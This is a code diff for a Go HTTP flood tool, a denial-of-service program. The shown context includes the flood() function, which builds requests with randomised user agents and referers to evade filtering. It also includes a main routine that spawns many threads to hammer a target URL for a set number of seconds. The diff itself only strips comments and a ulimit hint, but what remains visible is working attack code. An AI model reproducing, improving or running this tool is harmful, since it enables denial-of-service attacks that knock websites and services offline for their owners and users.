@@ -75,6 +75,7 @@ var (
 func init() {
 	rand.Seed(time.Now().UnixNano()) //fixed seed problem
 }
+
 func getuseragent() string {
 
 	platform := choice[rand.Intn(len(choice))]
@@ -128,7 +129,7 @@ func flood() {
 		header += addr + "\r\n"
 		if os.Args[5] == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
-			header += "User-Agent: " + getuseragent() + "\r\n" //choice7[rand.Intn(len(choice7)-1)] + "\r\n" //getuseragent() + "\r\n"
+			header += "User-Agent: " + getuseragent() + "\r\n"
 			header += acceptall[rand.Intn(len(acceptall))]
 			header += referers[rand.Intn(len(referers))] + "\r\n"
 		} else {
@@ -209,7 +210,6 @@ func flood() {
 func main() {
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
-		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
 		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
@@ -253,7 +253,6 @@ func main() {
 		go flood() // Start threads
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
-		//time.Sleep( time.Millisecond * 1)
 	}
 	fmt.Printf("\nPlease [Enter] for continue")
 	_, err = input.ReadString('\n')
@@ -264,5 +263,4 @@ func main() {
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
-	//Keep the threads continue
 }
